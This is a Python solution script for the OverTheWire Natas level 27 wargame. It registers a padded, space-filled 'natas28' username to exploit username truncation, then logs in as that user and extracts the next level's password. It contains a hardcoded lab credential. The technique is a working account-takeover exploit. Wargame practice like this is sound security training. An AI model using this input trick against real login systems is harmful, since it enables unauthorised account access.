#!/usr/local/bin/python3
import requests
import re

username = "natas27"
password = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"

url = 'http://%s.natas.labs.overthewire.org/' % username

s = requests.session()

data = {'username': "natas28                                                         dans", 'password': ''}
response = s.post(url, auth=(username, password), data=data)

data = {'username': 'natas28', 'password': ''}
response = s.post(url, auth=(username, password), data=data)
content = response.text

print(re.findall('&gt; (.*)', content)[1])
